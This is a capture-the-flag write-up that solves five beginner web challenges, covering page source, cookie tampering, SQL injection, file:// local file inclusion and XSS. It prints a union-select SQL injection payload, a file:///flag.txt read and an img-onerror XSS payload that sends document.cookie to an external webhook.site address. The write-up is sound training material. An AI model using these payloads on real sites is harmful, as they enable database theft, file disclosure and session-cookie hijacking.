### Web 8/8:~

#### Start at the Source

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7b6d1659-e78e-4543-b57b-0e6281ea98e4)

Checking the page source gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64baed16-debe-4ab9-92f0-86c0c02aa6a1)

```
Flag: utflag{1_l1ke_h1de_&_seek}
```

#### Cookies

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee338b71-afba-479a-930f-391337b4e2d6)

Checking the cookies available shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/065ebe70-f27a-470d-afd8-11058b418ff4)

I set the `isCookieMonster` to `true` 

And on refreshing the page I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/014558e8-f397-4b56-9b1b-e0efde833614)

```
Flag: utflag{c0ngrat5_tak3_a_byt3}
```

#### Baby SQLi 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df6e5bd9-c271-4b02-94f9-072422f05541)

We are given this:

```sql
INSERT INTO users(username, password, email) VALUES ('admin', 'utflag{*****************}', 'contact@isss.io');
```

So this means the value stored in column `password` will contain the flag

Moving over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1e403fcc-299a-4c23-9812-d88128aa21ef)

Searching for a valid mail returns the username it belongs to 
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/127159644/252477232-b98b35f8-b8c5-4956-a915-3eadf423d87c.png)

But a non valid mail turns an empty array
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f162a2c0-5c01-4cb6-99fe-3004a81b62b7)

When I inject a single quote `'` it returns error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ccdc987c-86eb-49fb-a0d8-6b8fa9de11e7)

But using `--` comments it and no error is shown
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79fd4c7f-423f-44f1-9927-04bca149728d)

This means that the web server is vulneable to SQL Injection

We can also tell from the Challenge name ðŸ˜‰

Since only a single table is available and the flag is in the password column. I will use a `union` query to get that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6221124d-4394-42c3-a4b5-912586b3b50e)

```
Payload: ' union select password from users --
```

And I got the flag

```
Flag: utflag{wow_lets_unionize}
```

#### Local File Inclusion 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09035a6c-4351-4f83-a4ca-beb5de45670f)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab466005-b7ed-4df6-855a-863d00fbe86f)

I tried including `google.com` and it returns the content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1715f839-b09f-460a-8607-b7df10a905f8)

One thing we should know is that not only `http and https` are the url protocols there's also `gopher, ftp, file etc.` 

The `file` protocol can be used in this case

We are already given the flag location to be at `/` 

Let us get it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6adf3015-86bf-4d67-ac1f-2743c0c41949)

```
Payload: file:///flag.txt
```

And I get the flag

```
Flag: utflag{g0t_y0ur_r3s0urc3!}
```

#### XSS
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c9b4ce77-3d13-48f3-b704-97f148f5b916)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/797af4c8-143f-4a67-996a-f9ce532f9ecf)

Giving it input shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff0cefde-8297-4cb8-8bbd-3e54085ee5d0)

When I clicked on the url it gave I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4118d0ea-e60d-4345-980e-24c435ceedc1)

And it is just in the form tag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e62e1c6-7926-4dd1-b3b1-93d4fd910f42)

I can try inject html tags 

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/417941d0-9723-4c7e-a4ec-f661debf4687)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/241c8bea-a00f-44f7-b488-4f72c064c5ec)

From the challenge description the flag is in the admin cookie

So from this vulnerability which is of cause Cross Site Scripting (XSS) we can steal the admin cookie

But when I tried injecting a `alert` tag I got error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cb7f975-4b51-4c52-9fc6-044602e3abef)

Luckily I don't even need that to steal the admin cookie

Here's the payload I used
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fc4c9b11-f085-42d1-b04d-82c4c5f85df8)

```
<img src=x onerror=this.src='https://webhook.site/04fe7606-2bda-443a-a66e-37be76febc63/?'+document.cookie;>
```

Back on the [webhook](https://webhook.site) site I got multiple http requess and each one contains the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c31dc362-1380-44cf-bef0-899634b2e0c3)

```
Flag: utflag{boop_beep_ddj333}
```
